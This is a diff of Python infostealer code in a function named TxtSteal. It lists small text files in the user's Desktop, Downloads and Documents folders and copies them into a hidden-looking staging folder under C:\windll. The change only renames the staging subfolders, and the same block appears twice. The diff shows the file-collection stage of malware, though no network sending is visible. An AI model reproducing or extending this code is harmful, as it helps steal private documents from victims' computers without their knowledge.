@@ -30,7 +30,7 @@ def TxtSteal():
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				shutil.copy(finnalytxtfiles[i], r'C:\windll\Txt\Desktop')
+				shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
@@ -45,7 +45,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\Txt\Downloads')
+			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Downloads')
 
 		def fromDocuments():
 			listoffiles = os.listdir(documents)
@@ -59,7 +59,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\Txt\Documents')
+			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
@@ -85,7 +85,7 @@ def TxtSteal():
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				shutil.copy(finnalytxtfiles[i], r'C:\windll\Txt\Desktop')
+				shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
@@ -100,7 +100,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\Txt\Downloads')
+			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Downloads')
 
 		def fromDocuments():
 			listoffiles = os.listdir(documents)
@@ -114,7 +114,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\Txt\Documents')
+			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
